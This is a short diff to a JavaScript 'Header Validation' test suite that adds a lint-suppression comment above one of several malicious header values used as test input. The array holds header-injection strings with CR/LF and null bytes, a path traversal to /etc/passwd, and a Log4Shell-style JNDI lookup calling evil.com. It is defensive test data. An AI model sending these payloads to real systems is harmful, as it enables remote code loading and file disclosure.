@@ -117,6 +117,7 @@ describe("Header Validation", () => {
         "consumer\n\r\x00",
         "consumer%00%0d%0a",
         "../../../etc/passwd",
+        // biome-ignore lint/suspicious/noTemplateCurlyInString: Security test payload
         "\\${jndi:ldap://evil.com/a}",
       ];
 
